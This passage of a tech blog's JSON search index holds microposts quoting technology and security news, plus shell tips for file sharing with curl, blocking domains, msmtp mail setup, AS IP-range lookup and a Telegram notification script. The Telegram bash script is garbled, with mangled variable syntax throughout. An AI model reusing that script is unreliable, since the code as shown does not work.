ieee.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/10/08/no-nobel-for-the-father-of-the-led/","loc":"https://karpoke.ignaciocano.com/2014/10/08/no-nobel-for-the-father-of-the-led/"},{"title":"Indian Developers Redesigning Linux Kernel With OOP, C++ Support","text":"DOS Lab IIT Madras and CDAC Chennai out of India are aiming to redesign the Linux kernel as MOOL, or the Minimalistic Object Oriented Linux. The project site explains, \"MOOL (Minimalistic Object Oriented Linux) aims at redesigning the Linux kernel to reduce coupling and increase maintainability by means of OO (Object Oriented) abstractions. Excessive common coupling prevails in existing kernel. Studies have shown that common coupling is increasing in successive versions of Linux. This will make maintainability of Linux difficult in coming years. As a starting step we have tried to reduce the number of global variables of the kernel. Some global variables are used only by two or three kernel modules. These are passed as function arguments. The performance of the modified kernel is measured with the standard performance analysis tools. The modified kernel performs almost same as original. MOOL features a device driver framework to write drivers in C++ and insert them as loadable kernel modules.\" Michael Larabel | phoronix.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/10/05/indian-developers-redesigning-linux-kernel-with-oop-c-support/","loc":"https://karpoke.ignaciocano.com/2014/10/05/indian-developers-redesigning-linux-kernel-with-oop-c-support/"},{"title":"Hacking Academia: Data Science and the University","text":"The problem we discussed is laid out in some detail in my Brain Drain post, but a quick summary is this: scientific research in many disciplines is becoming more and more dependent on the careful analysis of large datasets. This analysis requires a skill-set as broad as it is deep: scientists must be experts not only in their own domain, but in statistics, computing, algorithm building, and software design as well. Many researchers are working hard to attain these skills; the problem is that academia's reward structure is not well-poised to reward the value of this type of work. In short, time spent developing high-quality reusable software tools translates to less time writing and publishing, which under the current system translates to little hope for academic career advancement. » Jake Vanderplas | The Big Data Brain Drain: Why Science is in Trouble Jake Vanderplas | jakevdp.github.io","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/09/21/hacking-academia-data-science-and-the-university/","loc":"https://karpoke.ignaciocano.com/2014/09/21/hacking-academia-data-science-and-the-university/"},{"title":"Savvy Imgur user builds working 1KB hard drive inside 'vanilla' Minecraft","text":"Imgur user smellystring has officially changed my view of Minecraft – and he'll change yours as well. Below is a fully functional 1KB hard drive, created within Minecraft and it's incredible. Smellystring walks us through the process which includes binary blocks, pistons, a data collection room, indicator lights and \"bit\" emulators. Watch and learn. » reddit.com » | imgur.com Steven Norris | gearburn.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/09/21/savvy-imgur-user-builds-working-1kb-hard-drive-inside-vanilla-minecraft/","loc":"https://karpoke.ignaciocano.com/2014/09/21/savvy-imgur-user-builds-working-1kb-hard-drive-inside-vanilla-minecraft/"},{"title":"Hacker puts Doom on a printer to highlight security vulnerabilities","text":"Running Doom on a printer is more than a gimmick: it's a security concern. In 1993, first-person shooter Doom was a groundbreaking game. In 2014, it's being used by ethical hackers to demonstrate security vulnerabilities in connected devices. Tom Fox-Brewster | theguardian.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/09/20/hacker-puts-doom-on-a-printer-to-highlight-security-vulnerabilities/","loc":"https://karpoke.ignaciocano.com/2014/09/20/hacker-puts-doom-on-a-printer-to-highlight-security-vulnerabilities/"},{"title":"Why Archeologists Hate Indiana Jones","text":"It's not surprising that academics -- hell bent on taking the fun out of everything -- would hate our beloved and iconic movie version of them. But Canuto is no killjoy. His ironic tone and acerbic wit seem honed by long boring days in the sun. So I bite. I quickly learn that there's a good reason why most every archeologist on Earth hates Indy. And that they might have a point. Because Jones isn't an archeologist at all. Erik Vance | lastwordonnothing.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/09/19/why-archeologists-hate-indiana-jones/","loc":"https://karpoke.ignaciocano.com/2014/09/19/why-archeologists-hate-indiana-jones/"},{"title":"Google's Got an Open Source Android Problem","text":"Never has a tweet been more true, or potentially more disastrous for a vendor. Years ago Google's Andy Rubin, stung by Steve Jobs' criticism that Android wasn't truly open, tweeted that anyone could fork - i.e., modify - Android, making it \"open\" in the truest sense of the word. Unfortunately for Google, many OEMs took Rubin at his word. Today, Google's Android business is booming, but it's clear that Android fragmentation minimizes just how much Google—or its ecosystem of app developers—can make from the open-source mobile OS. Unfortunately, according to new ABI Research data, it's only going to get worse. Matt Asay | readwrite.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/09/14/googles-got-an-open-source-android-problem/","loc":"https://karpoke.ignaciocano.com/2014/09/14/googles-got-an-open-source-android-problem/"},{"title":"Notes from the development of xkcd's \"Pixels\"","text":"Over the years, I've had the pleasure of hacking on the frontend code for a bunch of xkcd's interactive comics, including: unixkcd, xk3d, Umwelt, Time, Externalities, and Lorenz. This weekend, I was pinged about making something to coincide with the release of What If?: Serious Scientific Answers to Absurd Hypothetical Questions. The process of building \"Pixels\" was even crazier than our usual April Fools rush, and had the extra intrigue of being live during Randall Munroe's Colbert Report interview. Here's a few anecdotes from the development of Pixels and a quick explanation of how it works. I hadn't worked with some of the graphics programming patterns (coordinate systems!) for a while, so I ended up making some classic mistakes – hopefully you can avoid repeating them. :) Max | chromakode.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/09/14/notes-from-the-development-of-xkcds-pixels/","loc":"https://karpoke.ignaciocano.com/2014/09/14/notes-from-the-development-of-xkcds-pixels/"},{"title":"Who invented pointers, amortized complexity, and more?","text":"Andrey Kolmogorov, Fred Hennie, Richard Stearns, and Walter Savitch are all famous separately; but they have something in common. Read on, and see. Today I wish to discuss some algorithmic tricks and show that they were initially used by complexity theorists, years before they were used by algorithm designers. To steal a phrase: it`s computational complexity all the way down. Well not exactly. The situation is slightly more complex\"a bad pun. The complexity theorists often invented a concept and used it in a narrow way, while later it was rediscovered and made a general notion. Dick Lipton | rjlipton.wordpress.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/09/09/who-invented-pointers-amortized-complexity-and-more/","loc":"https://karpoke.ignaciocano.com/2014/09/09/who-invented-pointers-amortized-complexity-and-more/"},{"title":"El primer 'bug'","text":"Ese día, la programadora Grace Hopper se encontraba trabajando con un Mark II en la Universidad de Harvard: el ordenador dejó de funcionar, y los ingenieros encontraron una polilla enganchada a uno de los relés del ordenador. El bicho pasó a la historia de la informática, porque pegaron sus restos en el libro de registro del ordenador, junto a una nota que decía 'First actual case of bug being found'. » ztfnews.wordpress.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/09/09/el-primer-bug/","loc":"https://karpoke.ignaciocano.com/2014/09/09/el-primer-bug/"},{"title":"Quickly navigate your filesystem from the command-line","text":"Like many others, I spend most of my day behind a computer. In order make the most of it (and to keep my body from complaining too much), I try to maintain an optimized setup. For example, I code in Vim, browse with Vimperator, and move windows around in i3. Another common task is filesystem navigation. I prefer to use the command-line for this, but typing cd \\~/some/very/deep/often-used/directory over and over again does become cumbersome. Jeroen Janssens | jeroenjanssens.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/09/07/quickly-navigate-your-filesystem-from-the-command-line/","loc":"https://karpoke.ignaciocano.com/2014/09/07/quickly-navigate-your-filesystem-from-the-command-line/"},{"title":"Compartiendo archivos en la nube desde el terminal","text":"Hay muchas maneras de compartir archivos, pero con curl.io podemos hacerlo directamente desde el terminal usando curl , permitiéndonos archivos hasta 5 GB y durante 4 horas, tiempo tras el cual será eliminados. Por ejemplo, para compartir el archivo /tmp/test : ```bash $ curl -F \"file=@/tmp/test\" http://curl.io/send/nzdqxcmf File successfully received. You can download test from this url: http://curl.io/get/nzdqxcmf/90571b24cf847434a171d41cb2043d6a561cb85b ``` Para recuperarlo: bash $ curl -o test http://curl.io/get/nzdqxcmf/90571b24cf847434a171d41cb2043d6a561cb85b Tal como nos sugieren en su web, también podemos enviarlo cifrado con gpg : bash $ gpg -c \"/tmp/test\" && curl -F \"file=@/tmp/test.gpg\" http://curl.io/send/nzdqxcmf Para recuperarlo y descifrarlo: bash curl http://curl.io/get/nzdqxcmf/90571b24cf847434a171d41cb2043d6a561cb85b | gpg -o test Absolutamente todo desde el terminal El hecho de poder compartir archivos en la nube desde el terminal está muy bien, pero no deja de ser un engorro tener que recurrir al navegador para poder obtener la URL de envío. Descargar el código fuente de la página no nos sirve porque la URL se genera por javascript y en la web se comprueba que el código de la URL sea válido (no sirve enviar cualquier cosa, aunque sí parece que se pueden reutilizar URLs válidas). Afortunadamente, podemos utilizar phantomjs . Mediante el siguiente script , curlio.js , podremos obtener una URL de envío válida: ```javascript var page = require('webpage').create(), address = \"http://curl.io\"; page.open(address, function(status) { if (status !== 'success') { console.log('Error loading address'); } else { var url = page.evaluate(function() { return document.getElementsByClassName('command')[0].innerHTML.replace(/&#94;.*/, \"\"); }); console.log(url); } phantom.exit(); }); ``` Un ejemplo de uso: bash $ phantomjs curlio.js http://curl.io/send/fgmnwl2e","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/09/06/compartiendo-archivos-en-la-nube-desde-el-terminal/","loc":"https://karpoke.ignaciocano.com/2014/09/06/compartiendo-archivos-en-la-nube-desde-el-terminal/"},{"title":"Game of thrones: A Compendium of Theories","text":"For those less familiar with the story and the theories, I thought it might be interesting and useful to have a single thread that lists all of the theories that have arisen given the various questions and unknowns surrounding the Song. There are a lot of brilliant people on these boards and some of them have come up with truly excellent theories, right or wrong, to answer those thoughts we have. » asoiaf.westeros.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/09/06/game-of-thrones-a-compendium-of-theories/","loc":"https://karpoke.ignaciocano.com/2014/09/06/game-of-thrones-a-compendium-of-theories/"},{"title":"Sistema binario: unos y ceros a través de la historia","text":"Los unos y los ceros llevan milenios entre nosotros, desde algunas culturas primitivas, pero las bombillas se han ido encendiendo poco a poco hasta llegar a su actual omnipresencia en la electrónica. Primero fueron Leibniz y la aritmética, luego Boole y la lógica, y finalmente Shannon y su idea de utilizar el álgebra de Boole para simplificar los circuitos. Una historia apasionante hasta llegar a nuestro smartphone. David G. Ortiz | blogthinkbig.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/09/06/sistema-binario-unos-y-ceros-a-traves-de-la-historia/","loc":"https://karpoke.ignaciocano.com/2014/09/06/sistema-binario-unos-y-ceros-a-traves-de-la-historia/"},{"title":"Érase una vez unos 'hackers' hispanos...","text":"Vivimos en una era de 'ciberguerras', intrusiones en línea e inseguridad informática, pero también en una época de libertad de acceso a cantidades ingentes de datos e información sin precedentes, de acceso casi ilimitado al conocimiento. No es posible explicar semejante paradoja sin asomarse la historia del 'hacking' y, aunque parezca mentira, en España esa historia es apasionante. » hackstory.es Pablo Romero | elmundo.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/09/05/erase-una-vez-unos-hackers-hispanos/","loc":"https://karpoke.ignaciocano.com/2014/09/05/erase-una-vez-unos-hackers-hispanos/"},{"title":"HubCap Chromecast Root Release","text":"We're happy to announce that fail0verflow, GTVHacker, and Team-Eureka have jointly discovered and exploited a new vulnerability in the Chromecast which allows root access on the current software build (17977) as well as new in box devices Team-Eureka | xda-developers.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/08/31/hubcap-chromecast-root-release/","loc":"https://karpoke.ignaciocano.com/2014/08/31/hubcap-chromecast-root-release/"},{"title":"Open letter to the Linux World","text":"So, what is systemd? Well, meet your new God. You may have been praying at the alter of simplicity, but your religion is being deprecated. It likely already happened without your knowledge during an upgrade of your Linux box. systemd is the all knowing, all controlling meta-deity that sees all and supervises all. It's the new One Master Process that aspires to control everything it can - and it's already doing a lot. It's what init would look like if it were a transformer on steroids. It's complicated, multi-faceted, opaque, and supremely powerful. Christopher Barry | lkml.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/08/31/open-letter-to-the-linux-world/","loc":"https://karpoke.ignaciocano.com/2014/08/31/open-letter-to-the-linux-world/"},{"title":"Offline attack shows Wi-Fi routers still vulnerable","text":"The attack exploits weak randomization, or the lack of randomization, in a key used to authenticate hardware PINs on some implementations of Wi-Fi Protected Setup, allowing anyone to quickly collect enough information to guess the PIN using offline calculations. By calculating the correct PIN, rather than attempting to brute-force guess the numerical password, the new attack circumvents defenses instituted by companies. » Offline bruteforce attack on WiFi Protected Setup » Hands-on: hacking WiFi Protected Setup with Reaver\\< /a> Robert Lemos | arstechnica.com/a>","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/08/30/offline-attack-shows-wi-fi-routers-still-vulnerable/","loc":"https://karpoke.ignaciocano.com/2014/08/30/offline-attack-shows-wi-fi-routers-still-vulnerable/"},{"title":"The Feynman Lectures on Physics, completely online","text":"Last fall, we let you know that Caltech and The Feynman Lectures Website joined forces to create an online edition of The Feynman Lectures on Physics. They started with Volume 1. And now they've followed up with Volume 2 and Volume 3, making the collection complete. » The Feynman Lectures on Physics, Volume I » | The Feynman Lectures on Physics, Volume II » The Feynman Lectures on Physics, Volume III » Free textbooks » | Free ebooks » openculture.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/08/30/the-feynman-lectures-on-physics-completely-online/","loc":"https://karpoke.ignaciocano.com/2014/08/30/the-feynman-lectures-on-physics-completely-online/"},{"title":"Hackers transform a smartphone gyroscope into an always-on microphone","text":"Apps that use your smartphone's microphone need to ask permission, but the motion sensors? No say-so needed. That might not sound like a big deal, but security researchers from Stanford University and defense firm Rafael have discovered a way to turn Android phone gyroscopes into crude microphones. They call their app \"Gyrophone\" and here's how it works: the tiny gyros in your phone that measure orientation do so using vibrating pressure plates. As it turns out, they can also pick up air vibrations from sounds, and many Android devices can do it in the 80 to 250 hertz range -- exactly the frequency of a human voice. Steve Dent | engadget.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/08/16/hackers-transform-a-smartphone-gyroscope-into-an-always-on-microphone/","loc":"https://karpoke.ignaciocano.com/2014/08/16/hackers-transform-a-smartphone-gyroscope-into-an-always-on-microphone/"},{"title":"Reflections on Trusting Trust","text":"You can't trust code that you did not totally create yourself. (Especially code from companies that employ people like me.) No amount of source-level verification or scrutiny will protect you from using untrusted code. In demonstrating the possibility of this kind of attack, I picked on the C compiler. I could have picked on any program-handling program such as an assembler, a loader, or even hardware microcode. As the level of program gets lower, these bugs will be harder and harder to detect. A well installed microcode bug will be almost impossible to detect. Ken Thompson | bell-labs.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/08/15/reflections-on-trusting-trust/","loc":"https://karpoke.ignaciocano.com/2014/08/15/reflections-on-trusting-trust/"},{"title":"The VP of Devil's Advocacy","text":"The tenth man. If nine of us look at the same information and arrive at the exact same conclusion, it's the duty of the tenth man to disagree. No matter how improbable it may seem, the tenth man has to start thinking with the assumption that the other nine are wrong. MG Siegler | techcrunch.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/08/07/the-vp-of-devils-advocacy/","loc":"https://karpoke.ignaciocano.com/2014/08/07/the-vp-of-devils-advocacy/"},{"title":"Why the Security of USB Is Fundamentally Broken","text":"That's the takeaway from findings security researchers Karsten Nohl and Jakob Lell plan to present next week, demonstrating a collection of proof-of-concept malicious software that highlights how the security of USB devices has long been fundamentally broken. The malware they created, called BadUSB, can be installed on a USB device to completely take over a PC, invisibly alter files installed from the memory stick, or even redirect the user's internet traffic. Because BadUSB resides not in the flash memory storage of USB devices, but in the firmware that controls their basic functions, the attack code can remain hidden long after the contents of the device's memory would appear to the average user to be deleted. And the two researchers say there's no easy fix: The kind of compromise they're demonstrating is nearly impossible to counter without banning the sharing of USB devices or filling your port with superglue. Andy Greenberg | wired.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/08/02/why-the-security-of-usb-is-fundamentally-broken/","loc":"https://karpoke.ignaciocano.com/2014/08/02/why-the-security-of-usb-is-fundamentally-broken/"},{"title":"Conseguir la lista actualizada de medios AEDE para bloquearlos","text":"La lista de medios asociados a AEDE se puede consultar en su página: www.aede.es/publica/Periodicos_Asociados.asp. Si no queremos visitar ni por error las páginas de dichos medios, tenemos diferentes alternativas, desde scripts de GreaseMonkey para Firefox y complementos para Chrome , hasta añadir los dominios en el fichero /etc/hosts , tal como haríamos si fuesen dominios maliciosos , o incluso complementos para WordPress . Los siguientes comandos nos facilitan descargar la lista de dominios: bash $ lynx -dump http://www.aede.es/publica/Periodicos_Asociados.asp | \\grep -Eo \"http://[&#94;/\\\"]+\" | \\grep -v aede.es | sort | uniq | awk \"{gsub(/http:\\/\\//, \\\"\\\"); print; gsub(/www\\./, \\\"\\\"); print; }\" | sed 's/&#94;/127.0.0.1 /' Una alternativa a lynx sería utilizar el comando curl : bash $ curl -so- http://www.aede.es/publica/Periodicos_Asociados.asp | \\grep -Eo \"http://[&#94;/\\\"]+\" | \\grep -v aede.es | sort | uniq | awk \"{gsub(/http:\\/\\//, \\\"\\\"); print; gsub(/www\\./, \\\"\\\"); print; }\" | sed 's/&#94;/127.0.0.1 /' Para que la lista sea más completa, también se podrían añadir los dominios alternativos (.com, .es, etc) o dominios de otras páginas de cada grupo de prensa: http://pykiss.github.io/anti-AEDE/domains.list . Referencias » Los usuarios de Menéame se levantan contra los medios de AEDE","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/07/27/conseguir-la-lista-actualizada-de-medios-aede-para-bloquearlos/","loc":"https://karpoke.ignaciocano.com/2014/07/27/conseguir-la-lista-actualizada-de-medios-aede-para-bloquearlos/"},{"title":"Hacker a los 70: abuelos de la informática moderna que aún pican código a diario","text":"Estamos tan inmersos en un mundo de electrónica, unos y ceros, que olvidamos lo recientes que son esos inventos que usamos a diario. Los primeros ordenadores personales verdaderamente relevantes nacieron a finales del siglo pasado: el Apple II (1977), el IBM PC (1981), el Commodore 64 (1982), el primer Macintosh (1984)¦ Windows nació aún más tarde, en 1985, como una extensión gráfica del sistema operativo MS-DOS. David G. Ortiz | yorokobu.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/07/22/hacker-a-los-70-abuelos-de-la-informatica-moderna-que-aun-pican-codigo-a-diario/","loc":"https://karpoke.ignaciocano.com/2014/07/22/hacker-a-los-70-abuelos-de-la-informatica-moderna-que-aun-pican-codigo-a-diario/"},{"title":"StackOverflow Update: 560M Pageviews A Month, 25 Servers, And It's All About Performance","text":"The network of sites that make up StackExchange, which includes StackOverflow, is now ranked 54th for traffic in the world; they have 110 sites and are growing at a rate of 3 or 4 a month; 4 million users; 40 million answers; and 560 million pageviews a month. This is with just 25 servers. For everything. That's high availability, load balancing, caching, databases, searching, and utility functions. All with a relative handful of employees. Now that's quality engineering. Todd Hoff | highscalability.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/07/21/stackoverflow-update-560m-pageviews-a-month-25-servers-and-its-all-about-performance/","loc":"https://karpoke.ignaciocano.com/2014/07/21/stackoverflow-update-560m-pageviews-a-month-25-servers-and-its-all-about-performance/"},{"title":"Sarah Harrison: \"No poder negar la verdad es lo que más les aterra\"","text":"Lo mismo sucede con el término de \"seguridad nacional\" ampliamente utilizado desde la aparición de los documentos de la NSA. \"El término en sí significa proteger la estabilidad de tu país dentro de tus fronteras, por tanto no hay razón para vigilar a todo un país o invadir todo un país. Lo que hacen es utilizarlo como término universal para asustar a la gente evitando que publiquen la verdad y permitiéndoles tapar sus propios actos ilegales\", y recuerda como en pro de esta seguridad nacional, la agencia de seguridad nacional britanica irrumpió el pasado agosto en la redacción del diario estadounidense The Guardian y destruyó discos duros y documentación, en un \"extraordinario acto contra la libertad de prensa\". \"Y eso pasó en un país occidental, pero era por la seguridad nacional\". Silvia Font | eldiario.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/07/21/sarah-harrison-no-poder-negar-la-verdad-es-lo-que-mas-les-aterra/","loc":"https://karpoke.ignaciocano.com/2014/07/21/sarah-harrison-no-poder-negar-la-verdad-es-lo-que-mas-les-aterra/"},{"title":"El Gobierno de España está librando una guerra en contra del internet y tú eres la víctima","text":"El canon AEDE se aprobaría el martes 22 de julio y sus implicaciones son mucho más grandes de lo que parece. Tasar el derecho a cita y legalizar medidas que atentan contra la libertad de expresión en internet. En este caso, la víctima eres tú. Eduardo Arcos | alt1040.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/07/21/el-gobierno-de-espana-esta-librando-una-guerra-en-contra-del-internet-y-tu-eres-la-victima/","loc":"https://karpoke.ignaciocano.com/2014/07/21/el-gobierno-de-espana-esta-librando-una-guerra-en-contra-del-internet-y-tu-eres-la-victima/"},{"title":"Visualizing Algorithms","text":"Algorithms are a fascinating use case for visualization. To visualize an algorithm, we don't merely fit data to a chart; there is no primary dataset. Instead there are logical rules that describe behavior. This may be why algorithm visualizations are so unusual, as designers experiment with novel forms to better communicate. This is reason enough to study them. But algorithms are also a reminder that visualization is more than a tool for finding patterns in data. Visualization leverages the human visual system to augment human intellect: we can use it to better understand these important abstract processes, and perhaps other things, too. Mike Bostock | bost.ocks.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/06/29/visualizing-algorithms/","loc":"https://karpoke.ignaciocano.com/2014/06/29/visualizing-algorithms/"},{"title":"The history of Android: The endless iterations of Google's mobile OS","text":"Android has been with us in one form or another for more than six years. During that time, we've seen an absolutely breathtaking rate of change unlike any other development cycle that has ever existed. When it came time for Google to dive in to the smartphone wars, the company took its rapid-iteration, Web-style update cycle and applied it to an operating system, and the result has been an onslaught of continual improvement. Lately, Android has even been running on a previously unheard of six-month development cycle, and that's slower than it used to be. For the first year of Android's commercial existence, Google was putting out a new version every two-and-a-half months. Ron Amadeo | arstechnica.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/06/17/the-history-of-android-the-endless-iterations-of-googles-mobile-os/","loc":"https://karpoke.ignaciocano.com/2014/06/17/the-history-of-android-the-endless-iterations-of-googles-mobile-os/"},{"title":"Los tres monos sabios de WhatsApp","text":"Abres WhatsApp cada diez minutos y, sin embargo, nunca has reparado en la historia fascinante que esconden tres de sus emoticonos más populares. Están en la categoría de smileys, justo debajo de la fila de expresivos gatitos amarillos, flanqueados por la máscara del lengendario Tengu nipón y una imponente calavera. A primera vista, son solo tres simpáticos y expresivos monos que dan mucho juego en las conversaciones, pero las apariencias engañan: detrás hay tradición, misterio y un lejano mito oriental. David G. Ortiz | yorokobu.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/06/15/los-tres-monos-sabios-de-whatsapp/","loc":"https://karpoke.ignaciocano.com/2014/06/15/los-tres-monos-sabios-de-whatsapp/"},{"title":"La primera hoja de cálculo para PCs cumple 35 años","text":"En la primavera de 1978 mientras que Dan Bricklin se sentaba en una de las clases del Máster que se estaba sacando en la Escuela de Empresariales de Harvard (Harvard Business School), se le ocurrió la idea de plasmar de forma electrónica lo que el profesor estaba haciendo en la pizarra. Éste, estaba dibujando una matriz con números en ciertas celdas y operaciones aritméticas en ciertas otras. Es decir, a Bricklin se le acababa de ocurrir la idea de crear una hoja de cálculo electrónica. » cyberhades.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/06/11/la-primera-hoja-de-calculo-para-pcs-cumple-35-anos/","loc":"https://karpoke.ignaciocano.com/2014/06/11/la-primera-hoja-de-calculo-para-pcs-cumple-35-anos/"},{"title":"We are rate limiting the FCC to dialup modem speeds until they pay us for bandwidth","text":"Since the FCC seems to have no problem with this idea, I've (through correspondence) gotten access to the FCC's internal IP block, and throttled all connections from the FCC to 28.8kbps modem speeds on the Neocities.org front site, and I'm not removing it until the FCC pays us for the bandwidth they've been wasting instead of doing their jobs protecting us from the \"keep America's internet slow and expensive forever\" lobby. kyledrake | neocities.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/06/05/we-are-rate-limiting-the-fcc-to-dialup-modem-speeds-until-they-pay-us-for-bandwidth/","loc":"https://karpoke.ignaciocano.com/2014/06/05/we-are-rate-limiting-the-fcc-to-dialup-modem-speeds-until-they-pay-us-for-bandwidth/"},{"title":"Configurar msmtp para enviar correo mediante GMail desde el terminal","text":"Otra alternativa para enviar correos electrónicos desde el terminal sin necesidad de tener instalado un servidor de correo. Su configuración es incluso más sencilla que con ssmtp . Si tenemos instalado ssmtp deberemos desinstalarlo para poder instalar msmtp . Instalamos mstmp-mta Instalamos el paquete msmtp-mta desde los repositorios y editamos el fichero de configuración ~/.msmtprc : ```bash defaults logfile ~/msmtp.log account gmail auth on host smtp.gmail.com from example@gmail.com auth on tls on tls_trust_file /usr/share/ca-certificates/mozilla/Equifax_Secure_CA.crt user example@gmail.com password secret port 587 account default : gmail ``` Le cambiamos los permisos: bash $ chmod 600 ~/.msmtprc Instalamos mailx Utilizaremos el comando mail del paquete bsd-mailx , también disponible en los repositorios. (También serviría el comando del mismo nombre pero del paquete heirloom-mailx .) Ya podemos probarlo: bash echo Lorem impsum dolor | mail -s Subject to@example.com Referencias » Send Gmail from the Linux Command Line","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/06/04/configurar-msmtp-para-enviar-correo-mediante-gmail-desde-el-terminal/","loc":"https://karpoke.ignaciocano.com/2014/06/04/configurar-msmtp-para-enviar-correo-mediante-gmail-desde-el-terminal/"},{"title":"ASCII Chart","text":"The American Standard Code for Information Interchange (ASCII) was developed under the auspices of a committee of the American Standards Association, called the X3 committee, by its X3.2 (later X3L2) subcommittee, and later by that subcommittee's X3.2.4 working group. The ASA became the United States of America Standards Institute or USASI and ultimately the American National Standards Institute. Charles Torvalds | askapache.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/06/01/ascii-chart/","loc":"https://karpoke.ignaciocano.com/2014/06/01/ascii-chart/"},{"title":"Obtener el listado de rangos de IPs asociados a un dominio","text":"Si queremos obtener el listado de rangos de IPs que puedan estar asociadas a un dominio, por ejemplo para bloquearlo, podemos ejecutar: bash $ IP=$(dig +short www.example.com | grep -Eo '([0-9]{1,3}\\.?){4}' | head -1) $ AS=$(whois $IP | awk '/OriginAS/{print $2}') $ test -n \"$AS\" && whois -h whois.radb.net '!g'$AS | tr -d \"\\n\" | tr \" \" \"\\n\" | sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 En la primera línea, obtenemos la IP asociada al dominio. En la segunda, obtenemos el registro origin , el cual utilizamos en la tercera línea para consultar a whois.radb.net el rango de IPs y mostrar las IPs una por línea. Esto nos da el listado de IPs v4, si queremos las IPs v6, podemos modificar ligeramente la tercera línea: bash $ whois -h whois.radb.net -- \"-i origin $AS\" | awk '/&#94;route6:/{print $2}' Referencias » How can I list all IPs relating to a single AS?","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/06/01/obtener-el-listado-de-rangos-de-ips-asociados-a-un-dominio/","loc":"https://karpoke.ignaciocano.com/2014/06/01/obtener-el-listado-de-rangos-de-ips-asociados-a-un-dominio/"},{"title":"The Forgotten History Of CGI","text":"The roots of CGI lie in the first mechanical aids to drawing and painting. The earliest of these were developed to help solve a problem every artist has found to be sticky: perspective. Before the introduction of geometric perspective, the realistic depiction of nature was not one of the purposes of art. Instead, artists chose the size and position of objects in a picture by their relative importance to one another. A distant castle might appear to be larger than one in the foreground simply because it was considered more important. Ron Miller | io9.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/05/31/the-forgotten-history-of-cgi/","loc":"https://karpoke.ignaciocano.com/2014/05/31/the-forgotten-history-of-cgi/"},{"title":"The Golden Age of Basic","text":"I remember my first program, by which I mean one that I cobbled together myself, not simply typing in a complete listing from the manual. I was twelve, the year was 1985, and the computer a Texas Instruments TI-99/4A (a machine which was actually the first 16-bit home computer). My program was a very simple text adventure game, created by chaining together as many IF¦ THEN GOTO statements as I had patience for. Stephen Cass | spectrum.ieee.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/05/31/the-golden-age-of-basic/","loc":"https://karpoke.ignaciocano.com/2014/05/31/the-golden-age-of-basic/"},{"title":"Programming Sucks","text":"Every friend I have with a job that involves picking up something heavier than a laptop more than twice a week eventually finds a way to slip something like this into conversation: \"Bro,1 you don't work hard. I just worked a 4700-hour week digging a tunnel under Mordor with a screwdriver.\" They have a point. Mordor sucks, and it's certainly more physically taxing to dig a tunnel than poke at a keyboard unless you're an ant. But, for the sake of the argument, can we agree that stress and insanity are bad things? Awesome. Welcome to programming. Peter Welch | stilldrinking.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/05/31/programming-sucks/","loc":"https://karpoke.ignaciocano.com/2014/05/31/programming-sucks/"},{"title":"Enviar y reicibir notificaciones de Telegram desde la línea de comandos","text":"Utilizando tg , podemos enviar y recibir mensajes de nuestros contactos en Telegram, incluyéndonos a nosotros mismos, desde el terminal. Envíos programados Combinándolo con expect , conseguiremos una forma sencilla de programar notificaciones. He aquí un pequeño ejemplo: ```bash !/usr/bin/env bash function tg { # First argument, if any, must be the receiver local to=\" \\(1\" local msg=\"\" local cmd=\"\" if [ $# -gt 1 ]; then shift 1 msg=\"\\) @\" else while read line; do if [ -z \" \\(msg\" ]; then msg=\\) line else msg=\" \\(msg\\n\\) line\" fi done if [ -z \" \\(to\" ]; then to=\\) (awk '{print \\(1}' <<< $msg) msg=\\) (awk '{ \\(1=\"\";print $0}' <<< $msg) fi fi if [[ $msg =~ \"\\n\" ]]; then file=\\) (mktemp) echo -e \" \\(msg\" > $file cmd=\"send_text $to $file\" else cmd=\"msg $to $msg\" fi #echo $cmd expect -c \" log_user 0 match_max 100000 spawn /path/to/telegram -k /path/to/tg-server.pub expect \\\"User \\\" send -- \\\"\\) cmd\\r\\\" expect \\\"Sent\\\" send \\\"quit\\\" \" } tg $@ ``` Algunos ejemplos de uso: ```bash Pasando todos los argumentos directamente $ tg.sh NombreContacto Lorem impsum dolor sit amet Pasando todos los argumentos desde una tubería $ echo NombreContacto Lorem impsum dolor sit amet | tg.sh Pasando el contacto a la función y el mensaje desde una tubería $ echo Lorem impsum dolor sit amet | tg.sh NombreContacto Pasando el resultado de un comando $ ls | tg.sh NombreContacto ``` Un problema que nos encontraremos es que si enviamos los mensajes al mismo contacto con el que hemos 